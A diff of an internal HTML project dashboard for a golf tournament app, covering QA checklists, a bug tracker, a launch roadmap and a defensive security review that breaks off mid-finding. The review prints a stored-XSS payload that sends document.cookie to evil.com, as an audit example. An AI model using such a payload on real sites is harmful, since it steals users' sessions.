+          <li>No Supabase key exposed in page source (grep for <code>eyJ</code>).</li>
+        </ul>
+      </div>
+      <div class="qa-step">
+        <div class="qa-step-title">Ops Hub ( /platform )</div>
+        <div class="qa-step-desc">Verify the internal dashboard loads and renders data correctly.</div>
+        <ul class="qa-checks">
+          <li>Auth gate: non-owner redirected. Owner lands on dashboard.</li>
+          <li>Action Board tab: CEO Checklist at top, Mission Control below.</li>
+          <li>Artifacts tab: cards render from qa-index.json. Concluded items auto-archived.</li>
+          <li>Grades tab: axis history chart renders. Grades accurate.</li>
+          <li>Bugs tab: historical bugs load from platform_bugs table.</li>
+        </ul>
+      </div>
+    </div>
 
-<div class="card-title" style="margin-bottom:0.75rem;">Flow B — Player Journey (Bova Invitational)</div>
-<div class="qa-flow" style="margin-bottom:2rem;">
-  <div class="qa-step">
-    <div class="qa-step-title">Tournament Home ( /t/bova/home )</div>
-    <div class="qa-step-desc">Verify home page loads and RSVP flow works.</div>
-    <ul class="qa-step-checks">
-      <li>Loading skeleton shows during data fetch — no blank flash.</li>
-      <li>Tournament name + logo injected by tourney-init.js.</li>
-      <li>Leaderboard renders with player scores.</li>
-      <li>RSVP form present. Submit requires invitation code.</li>
-      <li>Push notification subscription prompt appears after RSVP.</li>
-    </ul>
-  </div>
-  <div class="qa-step">
-    <div class="qa-step-title">Scoreboard ( /t/bova/scoreboard )</div>
-    <div class="qa-step-desc">Verify real-time leaderboard renders correctly.</div>
-    <ul class="qa-step-checks">
-      <li>Skeleton shimmer on initial load.</li>
-      <li>Players ranked by score. Tie-breaking correct.</li>
-      <li>Realtime subscription active — score change reflects within 3s.</li>
-      <li>Mobile viewport: table scrollable horizontally, no overflow clipping.</li>
-      <li>aria-live region on leaderboard tbody present (confirmed in 10a676f).</li>
-    </ul>
-  </div>
-  <div class="qa-step">
-    <div class="qa-step-title">Scorecard ( /t/bova/scorecard )</div>
-    <div class="qa-step-desc">Verify per-player score input works.</div>
-    <ul class="qa-step-checks">
-      <li>Player selection loads. Score inputs render per hole.</li>
-      <li>Save submits scores to DB. No 4xx on submit.</li>
-      <li>user-scalable=no removed (verified in commit c9cc497).</li>
-      <li>HIO detection fires confetti on score of 1.</li>
-    </ul>
-  </div>
-  <div class="qa-step">
-    <div class="qa-step-title">Feed ( /t/bova/feed )</div>
-    <div class="qa-step-desc">Verify feed renders and trash talk displays safely.</div>
-    <ul class="qa-step-checks">
-      <li>Feed loads activity items.</li>
-      <li>Player messages render as text — no raw HTML execution.</li>
-      <li>Verify feed.html:377 <code>_parseMentions</code> output — check if XSS fix applied.</li>
-      <li>Empty state renders correctly when no feed items.</li>
-    </ul>
-  </div>
-</div>
+    <div class="card" style="margin-bottom:1rem;">
+      <div class="card-title">Flow B — Player Journey (Bova Invitational)</div>
+      <div class="qa-step">
+        <div class="qa-step-title">Tournament Home ( /t/bova/home )</div>
+        <div class="qa-step-desc">Verify home page loads and RSVP flow works.</div>
+        <ul class="qa-checks">
+          <li>Loading skeleton shows during data fetch — no blank flash.</li>
+          <li>Tournament name + logo injected by tourney-init.js.</li>
+          <li>Leaderboard renders with player scores.</li>
+          <li>RSVP form present. Submit requires invitation code.</li>
+          <li>Push notification subscription prompt appears after RSVP.</li>
+        </ul>
+      </div>
+      <div class="qa-step">
+        <div class="qa-step-title">Scoreboard ( /t/bova/scoreboard )</div>
+        <div class="qa-step-desc">Verify real-time leaderboard renders correctly.</div>
+        <ul class="qa-checks">
+          <li>Skeleton shimmer on initial load.</li>
+          <li>Players ranked by score. Tie-breaking correct.</li>
+          <li>Realtime subscription active — score change reflects within 3s.</li>
+          <li>Mobile viewport: table scrollable horizontally, no overflow clipping.</li>
+          <li>aria-live region on leaderboard tbody present (confirmed in 10a676f).</li>
+        </ul>
+      </div>
+      <div class="qa-step">
+        <div class="qa-step-title">Scorecard ( /t/bova/scorecard )</div>
+        <div class="qa-step-desc">Verify per-player score input works.</div>
+        <ul class="qa-checks">
+          <li>Player selection loads. Score inputs render per hole.</li>
+          <li>Save submits scores to DB. No 4xx on submit.</li>
+          <li>user-scalable=no removed (verified in commit c9cc497).</li>
+          <li>HIO detection fires confetti on score of 1.</li>
+        </ul>
+      </div>
+      <div class="qa-step">
+        <div class="qa-step-title">Feed ( /t/bova/feed )</div>
+        <div class="qa-step-desc">Verify feed renders and trash talk displays safely.</div>
+        <ul class="qa-checks">
+          <li>Feed loads activity items.</li>
+          <li>Player messages render as text — no raw HTML execution.</li>
+          <li>Verify feed.html:377 <code>_parseMentions</code> output — check if XSS fix applied.</li>
+          <li>Empty state renders correctly when no feed items.</li>
+        </ul>
+      </div>
+    </div>
 
-<div class="card-title" style="margin-bottom:0.75rem;">Flow C — Admin Flow</div>
-<div class="qa-flow" style="margin-bottom:2rem;">
-  <div class="qa-step">
-    <div class="qa-step-title">Admin Auth Gate ( /t/bova/admin )</div>
-    <div class="qa-step-desc">Verify admin page enforces auth and tournament_admins membership.</div>
-    <ul class="qa-step-checks">
-      <li>Non-authenticated user redirected to /login.</li>
-      <li>Authenticated non-admin user blocked with error message.</li>
-      <li>Authenticated admin user lands on admin dashboard.</li>
-      <li>Admin check uses tournament_admins table — not players.is_admin (dropped in 006).</li>
-    </ul>
-  </div>
-  <div class="qa-step">
-    <div class="qa-step-title">Player Management Tab</div>
-    <div class="qa-step-desc">Verify player list renders and admin actions work.</div>
-    <ul class="qa-step-checks">
-      <li>Player list loads. All columns: Name, Team, Handicap, Status.</li>
-      <li>Player names rendered via esc() — no raw innerHTML injection.</li>
-      <li>Add player form works. Player appears in list after save.</li>
-      <li>Remove player RLS allows admin DELETE (migration 001 clear-scores policy).</li>
-    </ul>
-  </div>
-  <div class="qa-step">
-    <div class="qa-step-title">Design Tab — Settings</div>
-    <div class="qa-step-desc">Verify 24 settings keys are editable and persist.</div>
-    <ul class="qa-step-checks">
-      <li>All settings fields load current values from DB.</li>
-      <li>Save updates settings table. RLS write gate fires for non-admin (should 403).</li>
-      <li>Brand color change reflects across tournament pages.</li>
-    </ul>
-  </div>
-</div>
+    <div class="card" style="margin-bottom:1rem;">
+      <div class="card-title">Flow C — Admin Flow</div>
+      <div class="qa-step">
+        <div class="qa-step-title">Admin Auth Gate ( /t/bova/admin )</div>
+        <div class="qa-step-desc">Verify admin page enforces auth and tournament_admins membership.</div>
+        <ul class="qa-checks">
+          <li>Non-authenticated user redirected to /login.</li>
+          <li>Authenticated non-admin user blocked with error message.</li>
+          <li>Authenticated admin user lands on admin dashboard.</li>
+          <li>Admin check uses tournament_admins table — not players.is_admin (dropped in 006).</li>
+        </ul>
+      </div>
+      <div class="qa-step">
+        <div class="qa-step-title">Player Management Tab</div>
+        <div class="qa-step-desc">Verify player list renders and admin actions work.</div>
+        <ul class="qa-checks">
+          <li>Player list loads. All columns: Name, Team, Handicap, Status.</li>
+          <li>Portal button links to /player?as=email — gold admin banner visible in player view.</li>
+          <li>Team assignment UI renders. Drag or dropdown works.</li>
+          <li>Delete player fires confirmation. Removes from DB.</li>
+        </ul>
+      </div>
+      <div class="qa-step">
+        <div class="qa-step-title">Rounds + Scoring Tab</div>
+        <div class="qa-step-desc">Verify round management and score entry work.</div>
+        <ul class="qa-checks">
+          <li>Rounds list loads from rounds table. Format pills display (stroke/scramble/best_ball).</li>
+          <li>Score entry grid renders per round. Admin can enter and submit scores.</li>
+          <li>Scores persist to scores table. Scoreboard reflects updated values.</li>
+          <li>Round status toggle (open/closed) updates correctly.</li>
+        </ul>
+      </div>
+      <div class="qa-step">
+        <div class="qa-step-title">Push Notifications</div>
+        <div class="qa-step-desc">Verify admin can send push to tournament subscribers.</div>
+        <ul class="qa-checks">
+          <li>Push form renders in admin. Title + body inputs present.</li>
+          <li>Send button calls send-push edge function (v9). No 4xx.</li>
+          <li>Console shows no auth errors — JWT injected correctly.</li>
+        </ul>
+      </div>
+    </div>
 
-<div class="card-title" style="margin-bottom:0.75rem;">Flow D — PWA / Mobile</div>
-<div class="qa-flow" style="margin-bottom:2rem;">
-  <div class="qa-step">
-    <div class="qa-step-title">PWA Install</div>
-    <div class="qa-step-desc">Verify install prompt and manifest are correct.</div>
-    <ul class="qa-step-checks">
-      <li>manifest.json loads. name/short_name dynamic per tournament (not hardcoded).</li>
-      <li>Install banner fires on eligible browser (Android Chrome / Safari iOS).</li>
-      <li>Install surface visible on player.html (added in 10a676f).</li>
-      <li>Icon-192.png and icon-512.png load correctly.</li>
-    </ul>
-  </div>
-  <div class="qa-step">
-    <div class="qa-step-title">Offline Behavior</div>
-    <div class="qa-step-desc">Verify SW cache-first serves pages when offline.</div>
-    <ul class="qa-step-checks">
-      <li>Navigate to home, scoreboard, scorecard while online.</li>
-      <li>Toggle DevTools → Network → Offline.</li>
-      <li>All three pages still render from SW cache (tourney-v34).</li>
-      <li>Score inputs queue locally (localStorage offline_queue).</li>
-    </ul>
-  </div>
-  <div class="qa-step">
-    <div class="qa-step-title">Mobile Viewport</div>
-    <div class="qa-step-desc">Verify layout on 375px viewport (iPhone SE).</div>
-    <ul class="qa-step-checks">
-      <li>Nav hamburger renders on all tournament pages.</li>
-      <li>Leaderboard table scrolls horizontally — no content clipped.</li>
-      <li>Scorecard inputs usable without zoom (font-size:1rem on inputs).</li>
-      <li>Feed readable. Toast notifications render above fold.</li>
-      <li>prefers-reduced-motion: home.html animations stop (confirmed 10a676f).</li>
-    </ul>
-  </div>
-</div>
+    <div class="card" style="margin-bottom:1rem;">
+      <div class="card-title">Flow D — PWA / Mobile</div>
+      <div class="qa-step">
+        <div class="qa-step-title">PWA Install</div>
+        <div class="qa-step-desc">Verify install prompt and manifest are correct.</div>
+        <ul class="qa-checks">
+          <li>manifest.json loads. name/short_name dynamic per tournament (not hardcoded).</li>
+          <li>Install banner fires on eligible browser (Android Chrome / Safari iOS).</li>
+          <li>Install surface visible on player.html (added in 10a676f).</li>
+          <li>Icon-192.png and icon-512.png load correctly.</li>
+        </ul>
+      </div>
+      <div class="qa-step">
+        <div class="qa-step-title">Offline Behavior</div>
+        <div class="qa-step-desc">Verify SW cache-first serves pages when offline.</div>
+        <ul class="qa-checks">
+          <li>Navigate to home, scoreboard, scorecard while online.</li>
+          <li>Toggle DevTools → Network → Offline.</li>
+          <li>All three pages still render from SW cache (tourney-v34).</li>
+          <li>Score inputs queue locally (localStorage offline_queue).</li>
+        </ul>
+      </div>
+      <div class="qa-step">
+        <div class="qa-step-title">Mobile Viewport</div>
+        <div class="qa-step-desc">Verify layout on 375px viewport (iPhone SE).</div>
+        <ul class="qa-checks">
+          <li>Nav hamburger renders on all tournament pages.</li>
+          <li>Leaderboard table scrolls horizontally — no content clipped.</li>
+          <li>Scorecard inputs usable without zoom (font-size:1rem on inputs).</li>
+          <li>Feed readable. Toast notifications render above fold.</li>
+          <li>prefers-reduced-motion: home.html animations stop (confirmed 10a676f).</li>
+        </ul>
+      </div>
+    </div>
 
-<div class="card-title" style="margin-bottom:0.75rem;">Bug Tracker</div>
-<div class="table-wrap">
-  <table class="bug-table">
-    <thead>
-      <tr>
-        <th style="width:30px">#</th>
-        <th class="bug-sev">Severity</th>
-        <th style="min-width:140px">Flow / Page</th>
-        <th>Description</th>
-        <th style="min-width:110px">Status</th>
-      </tr>
-    </thead>
-    <tbody id="bugRows">
-      <tr>
-        <td style="color:var(--muted);font-size:0.75rem">1</td>
-        <td><span class="pill pill-orange">High</span></td>
-        <td>feed.html:377</td>
-        <td><code>_parseMentions(p.message)</code> to innerHTML — stored XSS on public feed. Fix: wrap output with esc() or use textContent.</td>
-        <td><select class="input-cell"><option>Open</option><option>In Progress</option><option>Fixed</option><option>Won't Fix</option></select></td>
-      </tr>
-      <tr>
-        <td style="color:var(--muted);font-size:0.75rem">2</td>
-        <td><span class="pill pill-orange">High</span></td>
-        <td>admin.html:~2044/2194</td>
-        <td><code>url</code> value rendered to innerHTML without esc(). Verify if url is user-controlled — if yes, XSS on admin page.</td>
-        <td><select class="input-cell"><option>Open</option><option>In Progress</option><option>Fixed</option><option>Won't Fix</option></select></td>
-      </tr>
-      <tr>
-        <td style="color:var(--muted);font-size:0.75rem">3</td>
-        <td><span class="pill pill-orange">High</span></td>
-        <td>Supabase / RLS</td>
-        <td><code>player_accounts</code> anon SELECT USING(true) — <code>005_invitations_and_accounts.sql:41</code>. Any anon user reads billing status.</td>
-        <td><select class="input-cell"><option>Open</option><option>In Progress</option><option>Fixed</option><option>Won't Fix</option></select></td>
-      </tr>
-      <tr>
-        <td style="color:var(--muted);font-size:0.75rem">4</td>
-        <td><span class="pill pill-gold">Medium</span></td>
-        <td>vercel.json / CSP</td>
-        <td>CSP has <code>unsafe-inline</code> — nullifies XSS header protection. Requires extracting inline scripts.</td>
-        <td><select class="input-cell"><option>Open</option><option>In Progress</option><option>Fixed</option><option>Won't Fix</option></select></td>
-      </tr>
-      <tr>
-        <td style="color:var(--muted);font-size:0.75rem">5</td>
-        <td><span class="pill pill-gold">Medium</span></td>
-        <td>Supabase Secrets</td>
-        <td>SEND_INSTALL_EMAIL_SECRET not set in Supabase dashboard — send-install-email v4 deployed but webhook gate inactive. Manual action required by Rob.</td>
-        <td><select class="input-cell"><option>Open</option><option>In Progress</option><option>Fixed</option><option>Won't Fix</option></select></td>
-      </tr>
-    </tbody>
-  </table>
-</div>
-<div style="margin-top:0.75rem;">
-  <button onclick="addBugRow()" style="background:var(--gold-dim);color:var(--gold);border:1px solid var(--border);border-radius:5px;padding:0.4rem 1rem;font-size:0.78rem;font-weight:700;cursor:pointer;font-family:inherit;letter-spacing:0.05em;text-transform:uppercase;">+ Add Bug Row</button>
-</div>
+    <div class="card-title" style="margin-bottom:.75rem;">Bug Tracker</div>
+    <div class="table-wrap">
+      <table class="bug-table">
+        <thead>
+          <tr>
+            <th style="width:30px">#</th>
+            <th style="width:90px">Severity</th>
+            <th style="min-width:130px">Flow / Page</th>
+            <th>Description</th>
+            <th style="min-width:110px">Status</th>
+          </tr>
+        </thead>
+        <tbody id="bugRows">
+          <tr>
+            <td style="color:var(--muted);font-size:.75rem">1</td>
+            <td><span class="pill pill-orange">High</span></td>
+            <td>feed.html:377</td>
+            <td><code>_parseMentions(p.message)</code> to innerHTML — stored XSS on public feed. Fix: use DocumentFragment or esc().</td>
+            <td><select class="input-cell"><option>Open</option><option>In Progress</option><option>Fixed</option><option>Won't Fix</option></select></td>
+          </tr>
+          <tr>
+            <td style="color:var(--muted);font-size:.75rem">2</td>
+            <td><span class="pill pill-orange">High</span></td>
+            <td>admin.html:~2044/2194</td>
+            <td><code>url</code> value rendered to innerHTML without esc(). Verify if url is user-controlled — if yes, XSS on admin page.</td>
+            <td><select class="input-cell"><option>Open</option><option>In Progress</option><option>Fixed</option><option>Won't Fix</option></select></td>
+          </tr>
+          <tr>
+            <td style="color:var(--muted);font-size:.75rem">3</td>
+            <td><span class="pill pill-orange">High</span></td>
+            <td>Supabase / RLS</td>
+            <td><code>player_accounts</code> anon SELECT USING(true) — <code>005_invitations_and_accounts.sql:41</code>. Any anon user reads billing status.</td>
+            <td><select class="input-cell"><option>Open</option><option>In Progress</option><option>Fixed</option><option>Won't Fix</option></select></td>
+          </tr>
+          <tr>
+            <td style="color:var(--muted);font-size:.75rem">4</td>
+            <td><span class="pill pill-gold">Medium</span></td>
+            <td>vercel.json / CSP</td>
+            <td>CSP has <code>unsafe-inline</code> — nullifies XSS header protection. Requires extracting inline scripts.</td>
+            <td><select class="input-cell"><option>Open</option><option>In Progress</option><option>Fixed</option><option>Won't Fix</option></select></td>
+          </tr>
+          <tr>
+            <td style="color:var(--muted);font-size:.75rem">5</td>
+            <td><span class="pill pill-gold">Medium</span></td>
+            <td>Supabase Secrets</td>
+            <td>SEND_INSTALL_EMAIL_SECRET — set but Authorization header not yet wired in DB webhook. Players INSERT webhook needs header added.</td>
+            <td><select class="input-cell"><option>Open</option><option>In Progress</option><option>Fixed</option><option>Won't Fix</option></select></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+    <div style="margin-top:.75rem;">
+      <button onclick="addBugRow()" style="background:var(--card2);color:var(--gold);border:1px solid var(--border-gold);border-radius:5px;padding:.4rem 1rem;font-size:.78rem;font-weight:700;cursor:pointer;font-family:inherit;letter-spacing:.05em;text-transform:uppercase;">+ Add Bug Row</button>
+    </div>
 
-</div>
+  </div>
 </section>
 
-<section id="business">
-<div class="wrapper">
-
-<div class="section-header">
-  <div class="section-eyebrow">§4 — Business Roadmap</div>
-  <div class="section-title">LLC → Launch</div>
-  <div class="section-desc">Seven steps from legal entity to first paid subscription. Most infrastructure already built — this is execution, not engineering.</div>
-</div>
-
-<div class="roadmap-item">
-  <div class="roadmap-icon">1</div>
-  <div class="roadmap-content">
-    <div class="roadmap-title">Form LLC</div>
-    <div class="roadmap-desc">Register Greenskeeper Studios LLC (or similar) in your state. Recommended: Wyoming or Delaware for simplicity. Use Northwest Registered Agent or Stripe Atlas.</div>
-    <div class="roadmap-action"><strong>Action:</strong> File online. Takes 1–5 business days. ~$50–$150. This unblocks everything downstream. <strong>Status: BLOCKED on Rob.</strong></div>
+<!-- ═══════════════════════════════════════════════════
+     §4 — BUSINESS ROADMAP
+     ═══════════════════════════════════════════════════ -->
+<section class="axis-stage" id="business" data-date="2026-05-13" data-agent="claude-sonnet-4-6">
+  <div class="stage-header">
+    <span class="stage-pill pill-biz">Business</span>
+    <span class="stage-date">May 13, 2026</span>
+    <span class="stage-agent">claude-sonnet-4-6</span>
   </div>
-</div>
+  <div class="stage-body">
 
-<div class="roadmap-item">
-  <div class="roadmap-icon">2</div>
-  <div class="roadmap-content">
-    <div class="roadmap-title">Get EIN</div>
-    <div class="roadmap-desc">Federal employer identification number. Required for banking and Stripe. IRS online application, free, immediate.</div>
-    <div class="roadmap-action"><strong>Action:</strong> irs.gov/businesses → Apply for EIN. Takes 15 minutes. Free. Do this same day as LLC approval.</div>
+    <div class="section-label">§4 — LLC → Launch Roadmap</div>
+    <p style="font-size:.83rem;color:var(--muted);margin-bottom:1.25rem;">Seven steps from legal entity to first paid subscription. Most infrastructure already built — this is execution, not engineering.</p>
+
+    <div class="phase-item p0 blocked">
+      <div class="phase-header">
+        <span class="phase-title">1 — Form LLC</span>
+        <span class="pill pill-red">P0 BLOCKER</span>
+        <span class="pill pill-gray">Rob Manual</span>
+      </div>
+      <div class="phase-body">Register Greenskeeper Studios LLC (or similar) in your state. Recommended: Wyoming or Delaware for simplicity. Use Northwest Registered Agent or Stripe Atlas.</div>
+      <div class="phase-ac">
+        <strong>Action</strong>
+        <ul><li>File online. Takes 1–5 business days. ~$50–$150. This unblocks everything downstream.</li></ul>
+      </div>
+    </div>
+
+    <div class="phase-item p0 blocked">
+      <div class="phase-header">
+        <span class="phase-title">2 — Get EIN</span>
+        <span class="pill pill-red">P0</span>
+        <span class="pill pill-orange">Blocked on LLC</span>
+        <span class="pill pill-gray">Rob Manual</span>
+      </div>
+      <div class="phase-body">Federal employer identification number. Required for banking and Stripe. IRS online application, free, immediate.</div>
+      <div class="phase-ac">
+        <strong>Action</strong>
+        <ul><li>irs.gov/businesses → Apply for EIN. Takes 15 minutes. Free. Do same day as LLC approval.</li></ul>
+      </div>
+    </div>
+
+    <div class="phase-item p0 blocked">
+      <div class="phase-header">
+        <span class="phase-title">3 — Open Business Bank Account</span>
+        <span class="pill pill-red">P0</span>
+        <span class="pill pill-orange">Blocked on LLC + EIN</span>
+        <span class="pill pill-gray">Rob Manual</span>
+      </div>
+      <div class="phase-body">Mercury (mercury.com) recommended — free, no minimums, excellent API. Required for Stripe payouts.</div>
+      <div class="phase-ac">
+        <strong>Action</strong>
+        <ul><li>Apply with LLC docs + EIN. Approval typically same day to 2 business days. $0 cost.</li></ul>
+      </div>
+    </div>
+
+    <div class="phase-item p1">
+      <div class="phase-header">
+        <span class="phase-title">4 — Publish ToS + Privacy Policy</span>
+        <span class="pill pill-orange">P1</span>
+        <span class="pill pill-gray">~2–3h engineering</span>
+      </div>
+      <div class="phase-body">Required by Stripe, GDPR, and CCPA. Two pages: Terms of Service (usage, payment, content) + Privacy Policy (data collected, Supabase, Stripe). TOURney design system already in place.</div>
+      <div class="phase-ac">
+        <strong>Action</strong>
+        <ul>
+          <li>Write + ship tos.html + privacy.html. Add /tos + /privacy rewrites to vercel.json.</li>
+          <li>Link from /create wizard and marketing footer.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="phase-item p1 blocked">
+      <div class="phase-header">
+        <span class="phase-title">5 — Activate Stripe Live Mode</span>
+        <span class="pill pill-orange">P1</span>
+        <span class="pill pill-orange">Blocked on LLC + Bank</span>
+        <span class="pill pill-gray">Rob Manual ~1h</span>
+      </div>
+      <div class="phase-body">The entire Stripe pipeline is already built and tested — <code>create-checkout</code> JWT-gated, <code>stripe-webhook</code> sig-verified, DB columns in place. This step is purely configuration.</div>
+      <div class="phase-ac">
+        <strong>Action</strong>
+        <ul>
+          <li>Create Stripe account under LLC. Set live <code>STRIPE_SECRET_KEY</code> + <code>STRIPE_WEBHOOK_SECRET</code> + <code>STRIPE_PRICE_PLAYER</code> in Supabase edge fn secrets.</li>
+          <li>Register webhook endpoint. Set <code>reg_open=true</code> in tournament settings.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="phase-item p2">
+      <div class="phase-header">
+        <span class="phase-title">6 — Accounting + Tax Posture</span>
+        <span class="pill pill-blue">P2</span>
+        <span class="pill pill-gray">Wave recommended (free)</span>
+      </div>
+      <div class="phase-body">Wave (waveapps.com) is free, handles Stripe + bank feed integration, sufficient pre-$100k ARR. Set aside ~25% of revenue for self-employment tax. Log Anthropic, Vercel, Supabase, Stripe fees as business expenses.</div>
+      <div class="phase-ac">
+        <strong>Action</strong>
+        <ul>
+          <li>Connect Mercury bank feed to Wave. Create expense categories.</li>
+          <li>Current monthly burn: ~$57/mo (Anthropic dominant). Breakeven: ~30 pro players at $2/mo.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="phase-item p2">
+      <div class="phase-header">
+        <span class="phase-title">7 — Business Insurance</span>
+        <span class="pill pill-blue">P2</span>
+        <span class="pill pill-gray">Month 2+</span>
+      </div>
+      <div class="phase-body">Cyber liability + E&amp;O insurance once revenue is flowing. Protects against data breach liability, GDPR fines, payment disputes. Hiscox or Embroker — typically $500–$1200/yr for a solo-founder SaaS.</div>
+      <div class="phase-ac">
+        <strong>Action</strong>
+        <ul><li>Get quotes from Hiscox (hiscox.com) and Embroker (embroker.com) post-launch. Not a blocker today.</li></ul>
+      </div>
+    </div>
+
+    <div class="card" style="margin-top:1.25rem;">
+      <div class="card-title">Realistic Timeline</div>
+      <table class="page-table" style="margin-top:.5rem;">
+        <thead><tr><th>Week</th><th>Milestone</th><th>Dependencies</th></tr></thead>
+        <tbody>
+          <tr><td><span class="pill pill-red">This Week</span></td><td>File LLC + Apply EIN</td><td>Rob action — no code work</td></tr>
+          <tr><td><span class="pill pill-orange">Week 2</span></td><td>Mercury bank opened. ToS + Privacy pages live. Wire players INSERT webhook header.</td><td>EIN + LLC approval</td></tr>
+          <tr><td><span class="pill pill-gold">Week 3</span></td><td>Stripe live account created. Price IDs created. Supabase secrets updated. reg_open=true.</td><td>Bank account</td></tr>
+          <tr><td><span class="pill pill-green">Week 4</span></td><td>First paid tournament live. Accounting connected. Stripe test-mode dry run complete.</td><td>Stripe live keys</td></tr>
+          <tr><td><span class="pill pill-blue">Month 2</span></td><td>GitHub Actions CI/CD for edge functions. CSP unsafe-inline removed. DB backup pipeline active.</td><td>Post-launch hardening</td></tr>
+        </tbody>
+      </table>
+    </div>
+
   </div>
-</div>
-
-<div class="roadmap-item">
-  <div class="roadmap-icon">3</div>
-  <div class="roadmap-content">
-    <div class="roadmap-title">Open Business Bank Account</div>
-    <div class="roadmap-desc">Mercury (mercury.com) recommended — free, no minimums, excellent API. Required for Stripe payouts.</div>
-    <div class="roadmap-action"><strong>Action:</strong> Apply with LLC docs + EIN. Approval typically same day to 2 business days. $0 cost.</div>
-  </div>
-</div>
-
-<div class="roadmap-item">
-  <div class="roadmap-icon">4</div>
-  <div class="roadmap-content">
-    <div class="roadmap-title">Publish ToS + Privacy Policy</div>
-    <div class="roadmap-desc">Required by Stripe, GDPR, and CCPA. Two pages: Terms of Service (usage, payment, content) + Privacy Policy (data collected, Supabase, Stripe). TOURney design system already in place.</div>
-    <div class="roadmap-action"><strong>Action:</strong> Write + ship tos.html + privacy.html. Add /tos + /privacy rewrites to vercel.json. Link from /create wizard and marketing footer. <strong>~2–3 hours engineering.</strong></div>
-  </div>
-</div>
-
-<div class="roadmap-item">
-  <div class="roadmap-icon">5</div>
-  <div class="roadmap-content">
-    <div class="roadmap-title">Activate Stripe — Flip to Live Keys</div>
-    <div class="roadmap-desc">The entire Stripe pipeline is already built and tested (create-checkout JWT-gated, stripe-webhook sig-verified, DB columns in place). This step is purely configuration.</div>
-    <div class="roadmap-action"><strong>Action:</strong> 1. Create Stripe account under LLC. 2. Set live STRIPE_SECRET_KEY + STRIPE_WEBHOOK_SECRET + STRIPE_PRICE_PLAYER in Supabase edge function secrets. 3. Register webhook endpoint. 4. Set reg_open=true in tournament settings. <strong>~1 hour.</strong></div>
-  </div>
-</div>
-
-<div class="roadmap-item">
-  <div class="roadmap-icon">6</div>
-  <div class="roadmap-content">
-    <div class="roadmap-title">Accounting + Tax Posture</div>
-    <div class="roadmap-desc">Quickbooks Self-Employed or Wave (free) for expense tracking. Set aside ~25% of revenue for self-employment tax. Log Anthropic, Vercel, Supabase, Stripe fees as business expenses.</div>
-    <div class="roadmap-action"><strong>Action:</strong> Connect Mercury bank feed to accounting tool. Create expense categories. Current monthly burn: ~$57/mo (Anthropic dominant). Breakeven: ~30 pro players at $2/mo.</div>
-  </div>
-</div>
-
-<div class="roadmap-item">
-  <div class="roadmap-icon">7</div>
-  <div class="roadmap-content">
-    <div class="roadmap-title">Business Insurance</div>
-    <div class="roadmap-desc">General liability + E&amp;O (errors &amp; omissions) for SaaS. Next Insurance or Hiscox. ~$30–$60/mo. Optional pre-launch but required before enterprise customers or significant revenue.</div>
-    <div class="roadmap-action"><strong>Action:</strong> Get quote at nextinsurance.com. Bind when first paying customer signs. Can defer until post-launch.</div>
-  </div>
-</div>
-
-<div class="card" style="margin-top:1.5rem;">
-  <div class="card-title">Realistic Timeline Grid</div>
-  <table class="page-table" style="margin-top:0.5rem;">
-    <thead><tr><th>Week</th><th>Milestone</th><th>Dependencies</th></tr></thead>
-    <tbody>
-      <tr><td><span class="pill pill-red">This Week</span></td><td>File LLC + Apply EIN</td><td>Rob action — no code work</td></tr>
-      <tr><td><span class="pill pill-orange">Week 2</span></td><td>Mercury bank opened. ToS + Privacy pages live. SEND_INSTALL_EMAIL_SECRET set.</td><td>EIN + LLC approval</td></tr>
-      <tr><td><span class="pill pill-gold">Week 3</span></td><td>Stripe live account created. Price IDs created. Supabase secrets updated. reg_open=true.</td><td>Bank account</td></tr>
-      <tr><td><span class="pill pill-green">Week 4</span></td><td>First paid tournament live. Accounting connected. Stripe test-mode dry run complete.</td><td>Stripe live keys</td></tr>
-      <tr><td><span class="pill pill-blue">Month 2</span></td><td>GitHub Actions CI/CD for edge functions. CSP unsafe-inline removed. DB backup pipeline active.</td><td>Post-launch hardening</td></tr>
-    </tbody>
-  </table>
-</div>
-
-</div>
 </section>
 
-<section id="security">
-<div class="wrapper">
+<!-- ═══════════════════════════════════════════════════
+     §5 — SECURITY REVIEW
+     ═══════════════════════════════════════════════════ -->
+<section class="axis-stage" id="security" data-date="2026-05-13" data-agent="claude-sonnet-4-6">
+  <div class="stage-header">
+    <span class="stage-pill pill-sec">Security</span>
+    <span class="stage-date">May 13, 2026</span>
+    <span class="stage-agent">claude-sonnet-4-6</span>
+  </div>
+  <div class="stage-body">
 
-<div class="section-header">
-  <div class="section-eyebrow">§5 — Security Review</div>
-  <div class="section-title">Findings &amp; Fix Plans</div>
-  <div class="section-desc">Evidence-based. Every finding cites a migration name, file:line, or policy name.</div>
-</div>
+    <div class="section-label">§5 — Security Findings &amp; Fix Plans</div>
 
-<p style="font-size:0.82rem;color:var(--muted);margin-bottom:1.5rem;padding:0.75rem 1rem;background:var(--card);border-left:3px solid var(--red);border-radius:0 6px 6px 0;">
-  <strong style="color:var(--red)">Methodology:</strong> Inspected all 11 migration SQL files for RLS policy definitions — specifically <code>USING (true)</code> predicates on sensitive tables. Grep'd <code>innerHTML</code> usage across all HTML and JS files (excluding .git and worktrees) to find unescaped render paths. Audited edge function auth patterns from prior session logs and grades.json security axis history. Reviewed vercel.json CSP header value. Reviewed send-push and send-install-email deployment status from qa-bugs-test-2026.md session 14 notes.
-</p>
+    <div class="card" style="margin-bottom:1.25rem;border-left:3px solid var(--red);">
+      <div class="card-title" style="color:var(--red);">Methodology</div>
+      <p>Inspected all 11 migration SQL files for RLS policy definitions — specifically <code>USING (true)</code> predicates on sensitive tables. Grep'd <code>innerHTML</code> usage across all HTML and JS files (excluding .git and worktrees) to find unescaped render paths. Audited edge function auth patterns from prior session logs and grades.json security axis history. Reviewed vercel.json CSP header value. Reviewed send-push and send-install-email deployment status from qa-bugs-test-2026.md session 14 notes.</p>
+    </div>
 
-<div class="sec-item sev-high">
-  <div class="sec-header"><span class="pill pill-red">HIGH</span><span class="sec-title">Stored XSS — feed.html:377 <code>_parseMentions</code> to innerHTML</span></div>
-  <div class="sec-body">
-    <code>feed.html:377</code>: the <code>_parseMentions(p.message)</code> function output is rendered directly to <code>innerHTML</code> without passing through <code>esc()</code>. The <code>p.message</code> field is player-controlled trash talk submitted via the feed post form. A malicious player submits <code>&lt;img src=x onerror="document.location='https://evil.com?c='+document.cookie"&gt;</code> as a message. When any player — or admin — opens the feed, the script executes in their session. Feed is a public page visible to all tournament participants.
-  </div>
-  <div class="sec-fix">
